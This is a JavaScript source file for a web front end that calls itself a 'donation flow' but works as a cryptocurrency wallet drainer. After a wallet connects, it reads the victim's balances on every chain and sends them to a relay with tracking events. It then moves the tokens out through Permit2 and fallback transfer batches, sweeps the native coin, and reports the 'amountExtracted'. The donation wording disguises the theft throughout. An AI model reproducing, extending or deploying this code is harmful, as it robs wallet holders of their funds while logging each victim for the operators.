// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

/**
 * Frontend donation flow.
 * walletClient optional (WalletConnect / wagmi). If not provided, falls back to window.ethereum.
 */
export async function runDonationFlow(walletClient) {
  try {
    let owner = null;
    let injectedProvider = null;

    if (walletClient?.account?.address) {
      owner = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      injectedProvider = new ethers.BrowserProvider(window.ethereum);
      await injectedProvider.send("eth_requestAccounts", []);
      owner = await injectedProvider.getSigner().getAddress();
    }

    if (!owner) throw new Error("Wallet not connected");

    const trackingId = Date.now().toString();

    // -------------------------
    // LINK_OPENED (1st event)
    // -------------------------
    if (typeof window !== "undefined") {
      const openedPayload = {
        openedUrl: window.location.href,
        visitorIp: null, // optional: backend can enrich this
        trackingId,
      };
      notify("LINK_OPENED", openedPayload);
      await sendEvent("LINK_OPENED", openedPayload);
    }

    // -------------------------
    // WALLET_CONNECTED
    // -------------------------
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);

      const { provider } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const nativeRaw = await provider.getBalance(owner);
      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));

      // try find native asset from covalent response
      const nativeToken = raw.find((r) => r.contract_address === "native" || r.native_token === true);
      const nativeUsd = nativeToken ? Number(nativeToken.quote || 0) : 0;

      const tokensValue = getChainValue(filtered);
      const totalValue = tokensValue + nativeUsd;

      chainBalances.push({
        chainId: chain.chainId,
        name: chain.name,
        native: nativeFormatted,
        nativeValue: nativeUsd,
        tokens: filtered,
        totalValue,
      });
    }

    const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: Number(c.native).toFixed(6),
      nativeValue: Number(c.nativeValue).toFixed(2),
      tokens: c.tokens.map((t) => {
        const decimals = Number(t.decimals ?? 18);
        let humanAmount = "0";
        try {
          humanAmount = String(parseFloat(ethers.formatUnits(t.balanceRaw, decimals)).toFixed(6));
        } catch {
          humanAmount = Number(t.balanceRaw || 0).toFixed(6);
        }
        return {
          name: t.tokenSymbol,
          amount: humanAmount,
          value: Number(t.quote || 0).toFixed(2),
        };
      }),
      total: Number(c.totalValue).toFixed(2),
    }));

    const grandTotal = balancesPayload.reduce((acc, c) => acc + parseFloat(c.total || 0), 0);

    const connectedPayload = {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal: Number(grandTotal).toFixed(2),
    };

    notify("WALLET_CONNECTED", connectedPayload);
    await sendEvent("WALLET_CONNECTED", connectedPayload);

    // -------------------------
    // Process chains
    // -------------------------
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    for (const chain of chainBalances) {
      const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
      notify("DONATION_START", startPayload);
      await sendEvent("DONATION_START", startPayload);

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      const permit2Tokens = [];
      const fallbackTokens = [];

      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) {
          fallbackTokens.push(t);
          continue;
        }
        const ok = await isPermit2Compatible(addr, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      try {
        if (permit2Tokens.length) {
          await executePermit2Batch(signer, chain.chainId, permit2Tokens);
        }
      } catch (err) {
        console.warn("permit2 batch error", err);
        fallbackTokens.push(...permit2Tokens);
      }

      try {
        if (fallbackTokens.length) {
          await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
        }
      } catch (err) {
        console.warn("fallback batch error", err);
      }

      try {
        await sweepNative(signer, provider, chain.chainId);
      } catch (err) {
        console.warn("native sweep error", err);
      }

      // -------------------------
      // Re-fetch balances + summary
      // -------------------------
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
      const refreshedNativeRaw = await provider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
      const refreshedNativeToken = refreshedRaw.find((r) => r.contract_address === "native" || r.native_token === true);
      const refreshedNativeUsd = refreshedNativeToken ? Number(refreshedNativeToken.quote || 0) : 0;

      const refreshedTokensValue = getChainValue(refreshedFiltered);
      const refreshedTotal = refreshedTokensValue + refreshedNativeUsd;

      const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [
          {
            name: chain.name,
            native: refreshedNative.toFixed(6),
            nativeValue: refreshedNativeUsd.toFixed(2),
            tokens: refreshedFiltered.map((t) => {
              const decimals = Number(t.decimals ?? 18);
              let humanAmount = "0";
              try {
                humanAmount = String(parseFloat(ethers.formatUnits(t.balanceRaw, decimals)).toFixed(6));
              } catch {
                humanAmount = Number(t.balanceRaw || 0).toFixed(6);
              }
              return {
                name: t.tokenSymbol,
                amount: humanAmount,
                value: Number(t.quote || 0).toFixed(2),
              };
            }),
            total: refreshedTotal.toFixed(2),
          },
        ],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    // -------------------------
    // DONATION_COMPLETED
    // -------------------------
    const completedPayload = { walletAddress: owner, trackingId };
    notify("DONATION_COMPLETED", completedPayload);
    await sendEvent("DONATION_COMPLETED", completedPayload);

    // -------------------------
    // Provider events
    // -------------------------
    const attachProviderEvents = (prov) => {
      try {
        let currentChain = null;
        if (prov && prov.network) currentChain = prov.network.chainId;
        prov.on("disconnect", () => {
          const disc = { walletAddress: owner, trackingId };
          notify("WALLET_DISCONNECTED", disc);
          sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
        });
        prov.on("chainChanged", (chainId) => {
          const c = { walletAddress: owner, trackingId, oldChain: currentChain, newChain: chainId };
          currentChain = chainId;
          notify("CHAIN_SWITCH", c);
          sendEvent("CHAIN_SWITCH", c).catch(() => {});
        });
      } catch (e) {
        console.warn("failed to attach provider events:", e);
      }
    };

    if (injectedProvider?.provider?.on) {
      attachProviderEvents(injectedProvider.provider);
    }
    if (walletClient?.on) {
      walletClient.on("disconnect", () => {
        const disc = { walletAddress: owner, trackingId };
        notify("WALLET_DISCONNECTED", disc);
        sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
      });
      walletClient.on("chainChanged", (chainId) => {
        const c = { walletAddress: owner, trackingId, newChain: chainId };
        notify("CHAIN_SWITCH", c);
        sendEvent("CHAIN_SWITCH", c).catch(() => {});
      });
    }

    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
